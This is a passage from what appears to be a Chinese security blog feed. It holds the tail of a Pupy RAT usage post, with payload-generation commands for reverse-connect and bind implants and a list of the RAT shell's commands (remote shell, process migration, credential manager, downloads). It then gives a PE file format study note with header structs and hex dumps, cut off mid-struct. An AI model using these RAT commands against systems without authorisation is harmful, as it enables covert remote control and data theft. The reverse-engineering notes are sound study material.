.so).</p></blockquote><br/><p>连接方式 (绑定、反射、DNS等)</p><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl"><span class="hljs-keyword">bind</span>, auto_proxy ,dnscnc, <span class="hljs-keyword">connect</span><br></code></pre></div></td></tr></table></figure><p>生成</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">gen</span> client -O windows -A x<span class="hljs-number">64</span> connect -c <span class="hljs-number">10.1.1.12:443</span> -t http<br><br><span class="hljs-attribute">gen</span> ps<span class="hljs-number">1</span> -O windows -A x<span class="hljs-number">86</span> bind --host <span class="hljs-number">10.1.1.12</span> --port <span class="hljs-number">8080</span><br></code></pre></div></td></tr></table></figure><p><img src="/assets/img/2020_12_17_17_47_pupy_rat_docker_use/2020-12-17-pm-8.35.02.png" alt="gen"></p><br/><h2 id="Base-Command"><a href="#Base-Command" class="headerlink" title="Base Command"></a>Base Command</h2><h3 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h3><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">&#123; COMMANDS &#125;<br>COMMAND   DESCRIPTION<br><span class="hljs-comment">-----------------------------------------------------------------------</span><br>dnscnc    DNSCNC control<br>jobs      Manage Jobs<br>help      <span class="hljs-keyword">Show</span> help<br>exposed   list exposed objects/methods<br>python    <span class="hljs-keyword">Start</span> the <span class="hljs-keyword">local</span> python interpreter (<span class="hljs-keyword">for</span> debugging purposes)<br>sessions  list/interact <span class="hljs-keyword">with</span> established sessions<br><span class="hljs-keyword">restart</span>   <span class="hljs-keyword">Restart</span> pupysh<br>tag       Assign tag <span class="hljs-keyword">to</span> <span class="hljs-keyword">current</span> <span class="hljs-keyword">session</span><br><span class="hljs-keyword">exit</span>      <span class="hljs-keyword">Exit</span> Shell<br><span class="hljs-keyword">connect</span>   <span class="hljs-keyword">Connect</span> <span class="hljs-keyword">to</span> the bind payload<br>run       Run a module <span class="hljs-keyword">on</span> one <span class="hljs-keyword">or</span> multiple clients<br>logging   <span class="hljs-keyword">Show</span>/<span class="hljs-keyword">set</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">level</span><br>config    <span class="hljs-keyword">Work</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">configuration</span> file<br>gen       Generate payload<br>creds     Credentials manager<br><span class="hljs-keyword">listen</span>    <span class="hljs-keyword">start</span>/stop/<span class="hljs-keyword">show</span> <span class="hljs-keyword">current</span> listeners<br></code></pre></div></td></tr></table></figure><br/><h3 id="ALIASED-MODULES"><a href="#ALIASED-MODULES" class="headerlink" title="ALIASED MODULES"></a>ALIASED MODULES</h3><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">&#123; ALIASED MODULES &#125;<br>MODULE   DESCRIPTION<br>------------------------------------------------------------<br><span class="hljs-built_in">getpid</span>   <span class="hljs-keyword">list</span> process information<br><span class="hljs-keyword">exit</span>     <span class="hljs-keyword">exit</span> the client <span class="hljs-keyword">on</span> the other side<br>getppid  <span class="hljs-keyword">list</span> parent process information<br><span class="hljs-keyword">cd</span>       <span class="hljs-keyword">change</span> directory<br>alive    request <span class="hljs-keyword">to</span> send keepalive packets <span class="hljs-keyword">on</span> rpyc level<br>rm       <span class="hljs-built_in">remove</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">file</span> <span class="hljs-built_in">or</span> <span class="hljs-keyword">a</span> directory<br>netstat  <span class="hljs-keyword">list</span> terminal sessions<br><span class="hljs-keyword">last</span>     <span class="hljs-keyword">list</span> terminal sessions<br><span class="hljs-keyword">w</span>        <span class="hljs-keyword">list</span> terminal sessions<br>date     Get current date<br><span class="hljs-keyword">cp</span>       <span class="hljs-keyword">copy</span> <span class="hljs-keyword">file</span> <span class="hljs-built_in">or</span> directory<br><span class="hljs-keyword">ps</span>       <span class="hljs-keyword">list</span> processes<br><span class="hljs-built_in">mkdir</span>    create <span class="hljs-keyword">an</span> <span class="hljs-built_in">empty</span> directory<br>forward  Local/remote port forwarding <span class="hljs-built_in">and</span> SOCKS proxy<br><span class="hljs-keyword">ls</span>       <span class="hljs-keyword">list</span> <span class="hljs-built_in">system</span> <span class="hljs-keyword">files</span><br><span class="hljs-keyword">cat</span>      show contents of <span class="hljs-keyword">a</span> <span class="hljs-keyword">file</span><br>mv       <span class="hljs-keyword">move</span> <span class="hljs-keyword">file</span> <span class="hljs-built_in">or</span> directory<br>ip       <span class="hljs-keyword">list</span> interfaces<br>http     Trivial Get/Post requests via HTTP protocol<br>getuid   <span class="hljs-built_in">get</span> username<br><span class="hljs-keyword">pwd</span>      Get current working dir<br></code></pre></div></td></tr></table></figure><br/><h3 id="Aliases"><a href="#Aliases" class="headerlink" title="Aliases"></a>Aliases</h3><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">&#123; ALIASES &#125;<br>ALIAS    COMMAND<br>----------------------------<br>info     get_info<br>pyexec   pyexec<br>exec     shell_exec<br>ps       ps<br>migrate  migrate<br>shell    interactive_shell<br>kill     process_kill<br>mount    drives<br>du       download -S<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE Format Note</title>
    <link href="/2020/11/30/13_25_pe_format_note/"/>
    <url>/2020/11/30/13_25_pe_format_note/</url>
    
    <content type="html"><![CDATA[<p>PE Format Note</p><a id="more"></a><h2 id="Baes"><a href="#Baes" class="headerlink" title="Baes"></a>Baes</h2><p>PE文件不是作为单一内存映射文件被载入内存的，Windows加载器(PE加载器)遍历 PE 文件决定文件的那一部分被映射</p><br/><p>PE文件被加载到内存后，内存中的版本被称为<strong>模块</strong></p><p>映射文件的起始地址称为<strong>模块句柄</strong>，可以过模块句柄访问内存中的其他数据结构<br>这个初始内存地址也称为 <strong>基地址(ImageBase)</strong></p><p>在 32位 Windows系统中可以直接调用 <code>GetModuleHandle</code> 以取得指向 DLL 的指针，通过指针访问该 DLL Module 的内容</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">HMOULDE <span class="hljs-title">GetModuleHandle</span><span class="hljs-params">(LPCTSTR lpModuleName)</span></span>;<br></code></pre></div></td></tr></table></figure><p>调用该函数时会传递一个可执行文件或 DLL 文件名字符串，如果系统找到文件，则返回该可执行文件或 DLL 文件映像所加载的基地址，也可以调用 GetModuleHandle来传递 NULL参数，此时将返回调用者的可执行文件的基地址</p><br/><p>基地址的值是由 PE文件本身设定的，默认 EXE文件的基地址是 <code>400000h</code>、DLL 文件的基地址是 <code>10000000h</code></p><br/><p>PE文件被映射到内存时，每个程序都有自己的虚拟空间，这个虚拟空间的内存地址称为虚拟地址(VA)</p><br/><p>为了避免在 PE文件中出现绝对内存地址引入了 <strong>相对虚拟地址(RVA)</strong> 的概念</p><p>RVA 只是内存中的一个简单的、相对于 PE文件载入地址(基地址)的偏移位置,它是一个相对的地址(或称偏移量)</p><p>假设一个 EXE文件从 400000h处载入，而它的<em>代码区块</em>开始于 401000h处，代码区块的 RVA 计算如下：</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">目标地址 <span class="hljs-number">401000</span><span class="hljs-built_in">h</span> - 载入地址 <span class="hljs-number">400000</span><span class="hljs-built_in">h</span> = RVA <span class="hljs-number">1000</span><span class="hljs-built_in">h</span><br></code></pre></div></td></tr></table></figure><p>将一个 RVA 转换成真实的地址，用实际的载入地址加 RVA，得到实际的内存地址：</p><figure class="highlight gcode"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gcode">虚拟地址VA = 基地址<span class="hljs-comment">(ImageBase)</span> + 相对虚拟地址<span class="hljs-comment">(RVA)</span><br><br><span class="hljs-comment">(ImageBase)</span><span class="hljs-number">400000</span>h + <span class="hljs-comment">(RVA)</span><span class="hljs-number">1000</span>h = <span class="hljs-comment">(VA)</span><span class="hljs-number">401000</span>h<br></code></pre></div></td></tr></table></figure><br/><p>当 PE文件存储在磁盘中时，某个数据的位置与文件头的偏移量称为 <strong>文件偏移地址(File Offset)**或 **物理地址(Raw Offset)</strong>; 文件偏移地址从 PE文件的第一个字符开始计数，起始值为 0; 用十六进制工具打开文件时，所显示的地址值就是文件偏移地址</p><br/> <h2 id="Dos-头"><a href="#Dos-头" class="headerlink" title="Dos 头"></a>Dos 头</h2><p>40 bytes</p><ul><li><a href="https://stackoverflow.com/questions/28911962/portable-executable-dos-header-length">Portable executable DOS header length</a></li></ul><br/><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// winNT.h</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DOS_HEADER</span> &#123;</span><br>    WORD  e_magic;      <span class="hljs-comment">/* 00: MZ Header signature */</span><br>    WORD  e_cblp;       <span class="hljs-comment">/* 02: Bytes on last page of file */</span><br>    WORD  e_cp;         <span class="hljs-comment">/* 04: Pages in file */</span><br>    WORD  e_crlc;       <span class="hljs-comment">/* 06: Relocations */</span><br>    WORD  e_cparhdr;    <span class="hljs-comment">/* 08: Size of header in paragraphs */</span><br>    WORD  e_minalloc;   <span class="hljs-comment">/* 0a: Minimum extra paragraphs needed */</span><br>    WORD  e_maxalloc;   <span class="hljs-comment">/* 0c: Maximum extra paragraphs needed */</span><br>    WORD  e_ss;         <span class="hljs-comment">/* 0e: Initial (relative) SS value */</span><br>    WORD  e_sp;         <span class="hljs-comment">/* 10: Initial SP value */</span><br>    WORD  e_csum;       <span class="hljs-comment">/* 12: Checksum */</span><br>    WORD  e_ip;         <span class="hljs-comment">/* 14: Initial IP value */</span><br>    WORD  e_cs;         <span class="hljs-comment">/* 16: Initial (relative) CS value */</span><br>    WORD  e_lfarlc;     <span class="hljs-comment">/* 18: File address of relocation table */</span><br>    WORD  e_ovno;       <span class="hljs-comment">/* 1a: Overlay number */</span><br>    WORD  e_res[<span class="hljs-number">4</span>];     <span class="hljs-comment">/* 1c: Reserved words */</span><br>    WORD  e_oemid;      <span class="hljs-comment">/* 24: OEM identifier (for e_oeminfo) */</span><br>    WORD  e_oeminfo;    <span class="hljs-comment">/* 26: OEM information; e_oemid specific */</span><br>    WORD  e_res2[<span class="hljs-number">10</span>];   <span class="hljs-comment">/* 28: Reserved words */</span><br>    DWORD e_lfanew;     <span class="hljs-comment">/* 3c: Offset to extended header */</span><br>&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;<br></code></pre></div></td></tr></table></figure><br/><p><code>xxe -l 0x40 calc.dll</code><br><code>xxe -l 64 calc.dll</code></p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............<br>00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......<br>00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................<br>00000030: 0000 0000 0000 0000 0000 0000 d000 0000  ................<br></code></pre></div></td></tr></table></figure><p>0x20 填充为 0，偏移从 0x30 开始</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">00000020:</span> <span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000</span>  <span class="hljs-string">................</span><br></code></pre></div></td></tr></table></figure><br/><p>PE文件头偏移量</p><p><code>xxd -s 0x3c -l 4 calc.dll</code></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0000003c</span>: d<span class="hljs-number">000</span> <span class="hljs-number">0000</span>                                ....<br></code></pre></div></td></tr></table></figure><p><code>e_lfanew</code> 值为: <code>000000d0h</code> </p><br/><h2 id="NT-头-PE-文件头"><a href="#NT-头-PE-文件头" class="headerlink" title="NT 头/ PE 文件头"></a>NT 头/ PE 文件头</h2><p>使用 DOS头的 <code>e_lfanew</code> 字段得到 PE文件头的起始偏移量，用其加上基址，得到 PE 文件头的指针</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_NT_HEADERS</span> &#123;</span><br>  DWORD                   Signature;    <span class="hljs-comment">// PE 文件标示</span><br>  IMAGE_FILE_HEADER       FileHeader;<br>  IMAGE_OPTIONAL_HEADER32 OptionalHeader;<br>&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;<br></code></pre></div></td></tr></table></figure><br/><h3 id="NT-文件头-PE-文件头"><a href="#NT-文件头-PE-文件头" class="headerlink" title="NT 文件头 / PE 文件头"></a>NT 文件头 / PE 文件头</h3><p>包含 PE 文件的一些基本信息，偏移量基于 PE文件头(<code>IMAGE_NT_HEADERS</code>)</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_FILE_HEADER</span> &#123;</span><br>  WORD  Machine;                <span class="hljs-comment">// 运行平台</span><br>  WORD  NumberOfSections;       <span class="hljs-comment">// 文件的区块数</span><br>  DWORD TimeDateStamp;          <span class="hljs-comment">// 文件创建日期和时间</span><br>  DWORD PointerToSymbolTable;   <span class="hljs-comment">// 指向符号表（用于调试）</span><br>  DWORD NumberOfSymbols;        <span class="hljs-comment">// 符号表中符号的个数（用于调试）</span><br>  WORD  SizeOfOptionalHeader;   <span class="hljs-comment">// IMAGE_OPTIONAL_HEADER32 结构的大小</span><br>  WORD  Characteristics;        <span class="hljs-comment">// 文件属性</span><br>&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;<br></code></pre></div></td></tr></table></figure><br/><p><code>000000d0</code> PE文件头起始偏移量</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">xxd -s 0xd0 -l 128 calc.dll<br></code></pre></div></td></tr></table></figure><p>Out:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">000000d0</span>: <span class="hljs-number">5045</span> <span class="hljs-number">0000</span> <span class="hljs-number">4</span>c<span class="hljs-number">01</span> <span class="hljs-number">0400</span> a<span class="hljs-number">00</span>b <span class="hljs-number">0</span>d<span class="hljs-number">53</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  PE..L......S....<br><span class="hljs-attribute">000000e0</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> e<span class="hljs-number">000</span> <span class="hljs-number">0221</span> <span class="hljs-number">0</span>b<span class="hljs-number">01</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">0002</span> <span class="hljs-number">0000</span>  .......!........<br><span class="hljs-attribute">000000f0</span>: <span class="hljs-number">000</span>e <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">3011</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span> <span class="hljs-number">0000</span>  ........<span class="hljs-number">0</span>.......<br><span class="hljs-attribute">00000100</span>: <span class="hljs-number">0020</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span> <span class="hljs-number">0010</span> <span class="hljs-number">0000</span> <span class="hljs-number">0002</span> <span class="hljs-number">0000</span>  . ..............<br><span class="hljs-attribute">00000110</span>: <span class="hljs-number">0600</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0600</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  ................<br><span class="hljs-attribute">00000120</span>: <span class="hljs-number">0050</span> <span class="hljs-number">0000</span> <span class="hljs-number">0004</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0200</span> <span class="hljs-number">4005</span>  .P............@.<br><span class="hljs-attribute">00000130</span>: <span class="hljs-number">0000</span> <span class="hljs-number">1000</span> <span class="hljs-number">0010</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">1000</span> <span class="hljs-number">0010</span> <span class="hljs-number">0000</span>  ................<br><span class="hljs-attribute">00000140</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">1000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  ................<br></code></pre></div></td></tr></table></figure><br/><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">WORD(2)  × 9 = 18<br>BYTE(1)  × 2 = 2<br>DWORD(4) × 19 = 76<br><span class="hljs-section">= 96</span><br></code></pre></div></td></tr></table></figure><br/><h3 id="可选头"><a href="#可选头" class="headerlink" title="可选头"></a>可选头</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_OPTIONAL_HEADER</span> &#123;</span><br><br>  <span class="hljs-comment">/* Standard fields */</span><br><br>  WORD  Magic; <span class="hljs-comment">/* 0x10b or 0x107 */</span><span class="hljs-comment">/* 0x00 */</span><br>  BYTE  MajorLinkerVersion;<br>  BYTE  MinorLinkerVersion;<br>  DWORD SizeOfCode;<br>  DWORD SizeOfInitializedData;<br>  DWORD SizeOfUninitializedData;<br>  DWORD AddressOfEntryPoint;<span class="hljs-comment">/* 0x10 */</span><br>  DWORD BaseOfCode;<br>  DWORD BaseOfData;<br><br>  <span class="hljs-comment">/* NT additional fields */</span><br><br>  DWORD ImageBase;<br>  DWORD SectionAlignment;<span class="hljs-comment">/* 0x20 */</span><br>  DWORD FileAlignment;<br>  WORD  MajorOperatingSystemVersion;<br>  WORD  MinorOperatingSystemVersion;<br>  WORD  MajorImageVersion;<br>  WORD  MinorImageVersion;<br>  WORD  MajorSubsystemVersion;<span class="hljs-comment">/* 0x30 */</span><br>  WORD  MinorSubsystemVersion;<br>  DWORD Win32VersionValue;<br>  DWORD SizeOfImage;<br>  DWORD SizeOfHeaders;<br>  DWORD CheckSum;<span class="hljs-comment">/* 0x40 */</span><br>  WORD  Subsystem;<br>  WORD  DllCharacteristics;<br>  DWORD SizeOfStackReserve;<br>  DWORD SizeOfStackCommit;<br>  DWORD SizeOfHeapReserve;<span class="hljs-comment">/* 0x50 */</span><br>  DWORD SizeOfHeapCommit;<br>  DWORD LoaderFlags;<br>  DWORD NumberOfRvaAndSizes;<br>  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="hljs-comment">/* 0x60 */</span><br>  <span class="hljs-comment">/* 0xE0 */</span><br>&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;<br></code></pre></div></td></tr></table></figure><br/><p><code>IMAGE_DATA_DIRECTORY</code>结构:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DATA_DIRECTORY</span> &#123;</span><br>  DWORD VirtualAddress;     <span class="hljs-comment">// 指向某个具体的表结构的RVA</span><br>  DWORD Size;               <span class="hljs-comment">// 这个表结构的大小</span><br>&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<br></code></pre></div></td></tr></table></figure><p>Directory Entries</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* Directory Entries, indices into the DataDirectory array */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_EXPORT0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_IMPORT1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_RESOURCE2</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_EXCEPTION3</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_SECURITY4</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_BASERELOC5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_DEBUG6</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_COPYRIGHT7</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_GLOBALPTR8   <span class="hljs-comment">/* (MIPS GP) */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_TLS9</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT11</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_IAT12  <span class="hljs-comment">/* Import Address Table */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT13</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR14</span><br></code></pre></div></td></tr></table></figure><br/><p><code>IMAGE_OPTIONAL_HEADER</code> 比较重要的几个字段：</p><ul><li>AddressOfEntryPoint: 持有 EP的 RVA值，指出程序最先执行的代码起始地址</li><li>ImageBase: 指出文件的优先装入地址（32位进程虚拟内存范围为：0～7FFFFFFF）</li><li>SectionAlignment: 内存中区块的对齐值</li><li>FileAlignment: 磁盘区块的对齐值</li><li>SizeOfImage: 指定了PE Image在虚拟内存中所占空间的大小</li><li>SizeOfHeaders: 指出整个PE头的大小</li><li>Subsystem: 区分系统驱动文件和普通可执行文件</li><li>NumberOfRvaAndSizes: 指定 DataDirectory数组的个数</li><li>DataDirectory: 由 <code>IMAGE_DATA_DIRECTORY</code> 结构体组成的数组</li></ul><br/><h2 id="节区头-区块表"><a href="#节区头-区块表" class="headerlink" title="节区头 / 区块表"></a>节区头 / 区块表</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_SECTION_HEADER</span> &#123;</span><br>  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];<br>  <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    DWORD PhysicalAddress;<br>    DWORD VirtualSize;<br>  &#125; Misc;                       <span class="hljs-comment">// 区块尺寸</span><br>  DWORD VirtualAddress;         <span class="hljs-comment">// 内存中区块 RAV 地址</span><br>  DWORD SizeOfRawData;          <span class="hljs-comment">// 磁盘文件中区块所占大小</span><br>  DWORD PointerToRawData;       